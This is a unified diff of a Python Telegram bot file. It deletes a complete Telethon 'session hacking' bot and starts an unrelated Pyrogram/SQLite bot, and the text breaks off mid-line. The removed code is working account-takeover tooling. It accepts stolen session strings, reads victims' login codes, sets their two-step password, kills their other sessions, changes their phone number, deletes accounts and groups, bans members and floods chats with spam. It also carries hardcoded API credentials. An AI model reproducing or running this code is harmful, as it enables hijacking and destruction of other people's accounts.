@@ -1,952 +1,264 @@
-
-#قم بوضع توكن البوت في سطر 17
-#قم بوضع يوزر البوت بدون @ في سطر 27
-
-
 from config import Config 
-import os
-from telethon import TelegramClient, events, functions, types, Button
-from datetime import timedelta
-import asyncio
-
-API_ID = ("19662621")
-import os, asyncio, re
-from os import system
-from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
-API_HASH = ("24c2270e7f1336eb59ca6c48e42ec6ca")
-token = Config.TG_BOT_TOKEN
-client = TelegramClient('ArabicHack', 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca").start(bot_token=token)
-from telethon import TelegramClient as tg
-from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
-from telethon.sessions import StringSession as ses
-from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
-import telethon;from telethon import functions
-from telethon.tl.types import ChannelParticipantsAdmins as cpa
-
-from telethon.tl.functions.channels import CreateChannelRequest as ccr
-mybot = "TmJoanBoT"
-bot = borg = client
-
-ArabicHack = 5154904380
-
-api_id = ("19662621")
-api_hash = ("24c2270e7f1336eb59ca6c48e42ec6ca")
-
-Bot_Username =(mybot , None) or "SessionHackingBot"
-
-async def change_number_code(strses, number, code, otp):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
-    bot = client = X
-    try:
-      await bot(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await bot(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await bot(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-		      await bot(leave("@Ids_Holder"))
-    except BaseException:
-      pass
-    try: 
-      result = await bot(functions.account.ChangePhoneRequest(
-        phone_number=number,
-        phone_code_hash=code,
-        phone_code=otp
-      ))
-      return True
-    except:
-      return False
-
-async def change_number(strses, number):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
-    bot = client = X
-    try:
-      await bot(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await bot(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await bot(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await bot(leave("@Ids_Holder"))
-    except BaseException:
-      pass
-    result = await bot(functions.account.SendChangePhoneCodeRequest(
-        phone_number=number,
-        settings=types.CodeSettings(
-            allow_flashcall=True,
-            current_number=True,
-            allow_app_hash=True
-        )
-    ))
-    return str(result)
-
-
-async def userinfo(strses):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
-    k = await X.get_me()
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
-    return str(k)
-
-async def terminate(strses):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
-    await X(rt())
-
-GROUP_LIST = []
-async def delacc(strses):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
-    try:
-      await X(join("@Ids_Holder"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@SAYTHONH"))
-    except BaseException:
-      pass
-    await X(functions.account.DeleteAccountRequest("I am chutia"))
-
-async def promote(strses, grp, user):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
-    try:
-      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
-    except:
-      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
-    
-async def user2fa(strses):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
-    try:
-      await X.edit_2fa('ArabicHack IS BEST')
-      return True
-    except:
-      return False
-
-async def demall(strses, grp):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
-    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
-      try:
-        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
-      except:
-        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
-      
-
-
-async def joingroup(strses, username):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
-    await X(join(username))
-
-
-async def leavegroup(strses, username):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
-    await X(leave(username))
-
-async def delgroup(strses, username):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
-    await X(dc(username))
-    
-
-async def cu(strses):
-  try:
-    async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
-        k = await X.get_me()
-        return [str(k.first_name), str(k.username or k.id)]
-  except Exception as e:
-    return False
-
-async def usermsgs(strses):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
-    i = ""
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
-    async for x in X.iter_messages(777000, limit=3):
-      i += f"\n{x.text}\n"
-    await client.delete_dialog(777000)
-    return str(i)
-
-
-async def userbans(strses, grp):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
-    k = await X.get_participants(grp)
-    for x in k:
-      try:
-        await X.edit_permissions(grp, x.id, view_messages=False)
-      except:
-        pass
-    
-
-
-async def userchannels(strses):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@SAYTHONH"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
-    k = await X(pc())
-    i = ""
-    for x in k.chats:
-      try:
-        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
-      except:
-        pass
-    return str(i)
-
-
-
-import logging
-logging.basicConfig(level=logging.WARNING)
-
-channel = "SAYTHONH"
-menu = '''
-
-**"A" :~ [Check user own groups and channels]
-
-"B" :~ [Check user all information like phone number, usrname... etc]
-
-"C" :~ [Ban a group {give me StringSession and channel/group username i will ban all members there}]
-
-"D" :~ [Know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]
-
-"E" :~ [Join A Group/Channel via StringSession]
-
-"F" :~ [Leave A Group/Channel via StringSession]
-
-"G" :~ [Delete A Group/Channel]
-
-"H" :~ [Check user two step is eneable or disable]
-
-"I" :~ [Terminate All current active sessions except Your StringSession]
-
-"J" :~ [Delete Account]
-
-"K" :~ [Demote all admins in a group/channel]
-
-"L" ~ [Promote a member in a group/channel]
-
-"M" ~ [Change Phone number using StringSession]
-
-"N" ~ [Spam commands]
-
-BY SOMY TEAM
-
-
-I will add more features Later 😅**
-'''
-mm = '''
-**⚜NOTICE FIRST JOIN SUPPORT @SAYTHONH⚜**
-'''
-
-keyboard = [
-  [  
-    Button.inline("A", data="A"), 
-    Button.inline("B", data="B"),
-    Button.inline("C", data="C"),
-    Button.inline("D", data="D"),
-    Button.inline("E", data="E")
-    ],
-  [
-    Button.inline("F", data="F"), 
-    Button.inline("G", data="G"),
-    Button.inline("H", data="H"),
-    Button.inline("I", data="I"),
-    Button.inline("J", data="J"),
-    ],
-  [
-    Button.inline("K", data="K"), 
-    Button.inline("L", data="L"),
-    Button.inline("M", data="M"),
-    Button.inline("N", data="N"),
-    ],
-  [
-    Button.url("Owner", "https://t.me/T_4_Z")
-    ]
-]
-
-@client.on(events.NewMessage(pattern="/start"))
-async def op(event):
-  global mm
-  if not event.is_private:
-    ArabicHack = [
-      [
-        Button.url("Click Here", f"https://t.me/SESSIONHACKABOT?start=hack")
-        ]
-      ]         
-    await event.reply("Click Below To Use Me", buttons=ArabicHack)
-  else:
-    legendbye = [
-      [
-        Button.url("Must Join", f"https://t.me/SAYTHONH")
-        ]
-      ]
-    await event.reply("First Join Channel!\n Then Try Click Here ~ /hack", buttons=legendbye)
-    
-       
-@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
-async def op(event):
-  ArabicHack = [
-    [
-      Button.url("Click Here", f"https://t.me/")
-      ]
-    ]         
-  await event.reply("Click Below To Use Me", buttons=ArabicHack)
-  
-@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
-async def start(event):
-  global menu
-  async with bot.conversation(event.chat_id) as x:
-    keyboard = [
-      [  
-        Button.inline("A", data="A"), 
-        Button.inline("B", data="B"),
-        Button.inline("C", data="C"),
-        Button.inline("D", data="D"),
-        Button.inline("E", data="E")
-        ],
-      [
-        Button.inline("F", data="F"), 
-        Button.inline("G", data="G"),
-        Button.inline("H", data="H"),
-        Button.inline("I", data="I"),
-        Button.inline("J", data="J")
-        ],
-      [
-        Button.inline("K", data="K"), 
-        Button.inline("L", data="L"),
-        Button.inline("M", data="M"),
-        Button.inline("N", data="N"),
-        ],
-      [
-        Button.url("Owner", "https://t.me/t_4_z")
-        ]
-    ]
-    await x.send_message(f"Choose what you want with string session \n\n{menu}", buttons=keyboard)
-    
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
-async def users(event):
-  async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.\n /hack", buttons=keyboard)
-      try:
-        i = await userchannels(strses.text)
-      except:
-        return await event.reply("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
-      if len(i) > 3855:
-        file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @T_4_Z")
-        file.close()
-        await bot.send_file(event.chat_id, "session.txt")
-        system("rm -rf session.txt")
-      else:
-        await event.reply(i + "\n\nThanks For using ArabicHackBot. \n/hack", buttons=keyboard)
-      
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
-async def users(event):
-  async with bot.conversation(event.chat_id) as x:
-    await x.send_message("GIVE STRING SESSION")
-    strses = await x.get_response()
-    op = await cu(strses.text)
-    if op:
-      pass
-    else:
-      return await event.respond("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
-    i = await userinfo(strses.text)
-    await event.reply(i + "\n\nThanks For using ArabicHack Bot.\n/hack", buttons=keyboard)
-    
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
-async def users(event):
-  async with bot.conversation(event.chat_id) as x:
-    await x.send_message("GIVE STRING SESSION")
-    strses = await x.get_response()
-    op = await cu(strses.text)
-    if op:
-      pass
-    else:
-      return await event.respond("String Session Has Been Terminated", buttons=keyboard)
-    await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
-    grpid = await x.get_response()
-    await userbans(strses.text, grpid.text)
-    await event.reply("Banning all members. Thanks For using ArabicHack Bot", buttons=keyboard)
-
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
-async def users(event):
-  async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using ArabicHack Bot", buttons=keyboard)
-    
-      
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
-async def users(event):
-  async with bot.conversation(event.chat_id) as x:
-    await x.send_message("GIVE STRING SESSION")
-    strses = await x.get_response()
-    op = await cu(strses.text)
-    if op:
-      pass
-    else:
-      return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-    await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
-    grpid = await x.get_response()
-    await joingroup(strses.text, grpid.text)
-    await event.reply("Joined the Channel/Group Thanks For using ArabicHack Bot", buttons=keyboard)
-
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
-async def users(event):
-  async with bot.conversation(event.chat_id) as x:
-    await x.send_message("GIVE STRING SESSION")
-    strses = await x.get_response()
-    op = await cu(strses.text)
-    if op:
-      pass
-    else:
-      return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-    await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
-    grpid = await x.get_response()
-    await leavegroup(strses.text, grpid.text)
-    await event.reply("Leaved the Channel/Group Thanks For using Boy Bot,", buttons=keyboard)
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
-async def users(event):
-  async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
-      grpid = await x.get_response()
-      await delgroup(strses.text, grpid.text)
-      await event.reply("Deleted the Channel/Group Thanks For using ArabicHackBot.", buttons=keyboard)
-
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
-async def users(event):
-  async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession is terminated maybe.", buttons=keyboard)
-      i = await user2fa(strses.text)
-      if i:
-        await event.reply("User don't have two step thats why now two step is `ArabicHack Bot Is best` you can login now\n\nThanks For using ArabicHack Bot.", buttons=keyboard)
-      else:
-        await event.reply("Sorry User Have two step already", buttons=keyboard)
-
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
-async def users(event):
-  async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      i = await terminate(strses.text)
-      await event.reply("The all sessions are terminated\n\nThanks For using ArabicHackBot.", buttons=keyboard)
-
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
-async def users(event):
-  async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      i = await delacc(strses.text)
-      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using ArabicHack Bot.", buttons=keyboard)
-
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
-async def users(event):
-  async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
-      grp = await x.get_response()
-      await x.send_message("NOW GIVE USER USERNAME")
-      user = await x.get_response()
-      i = await promote(strses.text, grp.text, user.text)
-      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)
-
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
-async def users(event):
-  async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
-      pro = await x.get_response()
-      try:
-        i = await demall(strses.text, pro.text)
-      except:
-        pass
-      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using ArabicHackBot.", buttons=keyboard)
-
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
-async def users(event):
-  async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession is terminated maybe", buttons=keyboard)
-      await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
-      number = (await x.get_response()).text
-      try:
-        result = await change_number(strses.text, number)
-        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
-        await asyncio.sleep(20)
-        await x.send_message("NOW GIVE PHONE CODE HASH")
-        phone_code_hash = (await x.get_response()).text
-        await x.send_message("NOW GIVE THE OTP")
-        otp = (await x.get_response()).text
-        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
-        if changing:
-          await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
-        else:
-          await event.respond("Something is wrong")
-      except Exception as e:
-        await event.respond("SEND THIS ERROR TO - @SAYTHONH\n**LOGS**\n" + str(e))
-
-
-
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"N")))
-async def start(event):
-    keyboard = [
-      [  
-        Button.inline("a", data="a"), 
-        Button.inline("b", data="b"),
-        Button.inline("c", data="c"),
-        ],
-      [
-        Button.url("Owner", "https://t.me/T_4_Z")
-        ]
-    ]
-    await event.reply("Now Give Me Flag Where U Want to Gcast \n✓ For All - Choose a\n✓ For Group - Choose b\n✓ For Private - Choose c", buttons=keyboard)
-
-
-
-async def gcasta(strses, msg):
-    async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
-        try:
-            reply_msg = msg
-            tol = reply_msg
-            file = None
-            async for aman in X.iter_dialogs():
-                chat = aman.id
-                try:
-                    await X.send_message(chat, tol, file=file)     
-                    if lol != -1001551357238:
-                        await asyncio.sleep(60)
-                        await X.send_message(chat, tol, file=file)
-                        await asyncio.sleep(60)
-                        await X.send_message(chat, tol, file=file)
-                        await asyncio.sleep(60)
-                        await X.send_message(chat, tol, file=file)
-                        await asyncio.sleep(60)
-                        await X.send_message(chat, tol, file=file)
-                        await asyncio.sleep(60)
-                        await X.send_message(chat, tol, file=file)
-                        await asyncio.sleep(60)
-                        await X.send_message(chat, tol, file=file)
-                        await asyncio.sleep(60)
-                        await X.send_message(chat, tol, file=file)
-                        await asyncio.sleep(60)
-                        await X.send_message(chat, tol, file=file)
-                        await asyncio.sleep(60)
-                        await X.send_message(chat, tol, file=file)
-                    elif chat == -1001606996743:
-                        pass
-                    await asyncio.sleep()
-                except Exception as e:
-                    print(e)
-        except Exception as e:
-            print(e)        
-
-
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"a")))
-async def users(event):
-  async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      await x.send_message("NOW GIVE MSG")
-      msg = await x.get_response()
-      await x.send_message("Now Done It Will Send message automatically every 10 min")
-      i = await gcasta(strses.text, msg.text)
-      await event.reply(f"Done Gcasted In {i} all 😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)
-
-molb = True
-
-async def gcastb(strses, msg):
-    async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
-        try:
-            reply_msg = msg
-            tol = reply_msg
-            file = None
-            async for sweetie in X.iter_dialogs():
-                if sweetie.is_group:
-                    chat = sweetie.id
-                    try:
-                        if chat != -1001606996743:
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(600)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(600)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            await asyncio.sleep(60)
-                            await X.send_message(chat, tol, file=file)
-                            while molb != False:
-                                await asyncio.sleep(600)
-                                await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=60))
-                        elif chat == -1001606996743:
-                            pass
-                    except Exception as e:
-                        print(e)
-        except Exception as e:
-            print(e)
-
-
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"b")))
-async def users(event):
-  async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      await x.send_message("NOW GIVE MSG")
-      msg = await x.get_response()
-      await x.send_message("Now Done It Will Send message automatically every 10 min")
-      i = await gcastb(strses.text, msg.text)
-      await event.reply(f"Done Gcasted In {i} Group 😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)
-
-async def gcastc(strses, msg):
-    async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
-        try:
-            reply_msg = msg
-            tol = reply_msg
-            file = None
-            async for krishna in X.iter_dialogs():
-                if krishna.is_user and not krishna.entity.bot:
-                    chat = krishna.id
-                    try:
-                        await X.send_message(chat, tol, file=file)
-                        while molc != False:
-                            await asyncio.sleep(10)
-                            await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=20))
-                    except BaseException:
-                        pass
-        except Exception as e:
-            print(e)
-
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"c")))
-async def users(event):
-  async with bot.conversation(event.chat_id) as x:
-      await x.send_message("GIVE STRING SESSION")
-      strses = await x.get_response()
-      op = await cu(strses.text)
-      if op:
-        pass
-      else:
-        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
-      await x.send_message("NOW GIVE MSG IT WILL AUTOMATALLY START")
-      msg = await x.get_response()
-      await x.send_message("Now Done It Will Send message automatically every 10 min")
-      i = await gcastc(strses.text, msg.text)
-      await event.reply(f"Done Gcasted In {i} Private😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)
-
-print("⚜️ Bot Deploy Successfully ⚜️ Kindly Join @SAYTHONH|SYTHONTM")
-client.run_until_disconnected()
+from pyrogram import (Client ,filters)
+from datetime import (date)
+from pyrogram.types import (Message,InlineKeyboardButton,InlineKeyboardMarkup,ReplyKeyboardMarkup,ForceReply,CallbackQuery)
+from pyromod import listen
+import sqlite3,os,time
+con = sqlite3.connect(database="b3KkK.db",check_same_thread=False)
+db = con.cursor()
+
+db.execute('''CREATE TABLE IF NOT EXISTS TWSEL (chat_id INTEGER PRIMARY KEY)''')
+db.execute('''CREATE TABLE IF NOT EXISTS USERS (user_id INTEGER PRIMARY KEY)''')
+db.execute('''CREATE TABLE IF NOT EXISTS BAN_USERS (user_id INTEGER PRIMARY KEY)''')
+con.commit()
+
+
+def GET_USERS() -> str:
+	USERS = []
+	try:
+		db.execute("SELECT * FROM USERS")
+		for USER in db.fetchall():
+			USERS.append(USER[0])
+		return USERS
+	except:
+		return []
+
+def GET_BAN_USERS() -> str:
+	BAN_USERS = []
+	try:
+		db.execute("SELECT * FROM BAN_USERS")
+		for USER in db.fetchall():
+			BAN_USERS.append(USER[0])
+		return BAN_USERS
+	except:
+		return []
+
+def CHECK_BAND(user_id:int) -> str:
+	db.execute("SELECT user_id FROM BAN_USERS WHERE user_id = ?",(user_id,))
+	return bool(db.fetchall())
+
+def ADD_BAN(user_id:int):
+	if CHECK_BAND(user_id=user_id):
+		return
+	db.execute("INSERT INTO BAN_USERS(user_id) VALUES(?)",(user_id,))
+	con.commit()
+
+def DEL_BAN(user_id:int):
+	if not CHECK_BAND(user_id=user_id):
+		return
+	db.execute("DELETE FROM BAN_USERS WHERE user_id = ?",(user_id,))
+	con.commit()
+
+b3kkk = Client("Channel - B3KKK",
+api_id=14170449,
